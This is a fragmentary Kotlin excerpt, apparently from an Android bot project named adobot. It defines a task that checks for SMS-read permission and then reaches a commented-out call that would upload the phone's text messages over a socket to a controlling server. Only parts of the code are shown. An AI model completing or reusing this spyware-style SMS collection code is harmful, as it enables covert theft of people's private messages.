...
import me.adobot.models.Sms
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import kotlin.collections.ArrayList

class GetSmsTask(private val ctx: Context, private var arg1: Int=100, private val socket: Socket) : BaseTask(ctx) {
    ...
    override fun run() {
        ...
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED)
            /*socket.emit("smsUpload", uploadSms(), Ack { args ->
